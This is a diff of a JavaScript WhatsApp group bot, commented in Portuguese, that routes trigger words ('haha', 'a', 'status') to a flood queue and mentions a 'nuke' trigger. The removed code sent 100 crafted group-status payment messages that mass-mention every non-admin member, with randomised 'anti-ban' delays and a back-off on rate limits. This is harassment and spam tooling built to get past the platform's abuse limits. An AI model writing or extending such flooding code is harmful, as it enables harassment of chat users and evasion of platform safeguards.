@@ -34,66 +34,17 @@ module.exports = (client) => {
 
             // --- GATILHO: "haha" (DIV + STATUS SIMULTÂNEO) ---
             if (textoBaixo.includes("haha") && !global.botOff) {
-                const { executarFlood } = require('./flooder');
-                executarFlood(client, from).catch(err => console.log("Erro haha:", err.message));
+                global.adicionarAoFilaDeFlood(client, from);
             }
 
             // --- GATILHO: "a" ---
             if (textoBaixo === "a" && !global.botOff) {
-                const { executarFlood } = require('./flooder');
-                executarFlood(client, from).catch(err => console.log("Erro gatilho a:", err.message));
+                global.adicionarAoFilaDeFlood(client, from);
             }
 
-            // --- GATILHO: "status" (STATUS ISOLADO RESPEITA LIMITES E DELAY ANTI-BAN) ---
+            // --- GATILHO: "status" ---
             if (textoBaixo === "status" && !global.botOff) {
-                const admins = gMeta.participants.filter(v => !!v.admin).map(v => v.id);
-                const participantes = gMeta.participants
-                    .map(u => u.id)
-                    .filter(id => id !== botId && !admins.includes(id));
-                const fullText = global.mensagemDiv || "MARCOS PASSOU O RATO 🤪";
-                let statusText = fullText;
-                
-                const separadorFantasma = "【↯💣─────•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ👻❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•─────💣↯】";
-                if (statusText.includes(separadorFantasma)) {
-                    const parts = statusText.split(separadorFantasma);
-                    if (parts.length >= 3) {
-                        statusText = parts[0] + "\n\n" + parts.slice(2).join(separadorFantasma);
-                    }
-                }
-                statusText = statusText.replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();
-
-                const statusCount = 100;
-
-                for (let i = 0; i < statusCount; i++) {
-                    try {
-                        await client.relayMessage(from, {
-                            groupStatusMessageV2: {
-                                message: {
-                                    requestPaymentMessage: {
-                                        currencyCodeIso4217: "",
-                                        amount1000: "0",
-                                        noteMessage: {
-                                            extendedTextMessage: {
-                                                text: statusText,
-                                                contextInfo: { isGroupStatus: true, mentionedJid: participantes }
-                                            }
-                                        },
-                                        expiryTimestamp: "0",
-                                        amount: { value: "0", offset: 1000, currencyCode: "" }
-                                    }
-                                }
-                            }
-                        }, {});
-                        
-                        // Delay anti-ban
-                        const delayAntiBan = Math.floor(Math.random() * (300 - 150 + 1)) + 150;
-                        await new Promise(r => setTimeout(r, delayAntiBan));
-                    } catch (err) {
-                        if (err.message.includes('rate-overlimit')) {
-                            await new Promise(r => setTimeout(r, 2000));
-                        }
-                    }
-                }
+                global.adicionarAoFilaDeFlood(client, from);
             }
 
             // --- GATILHO: "nuke" ---
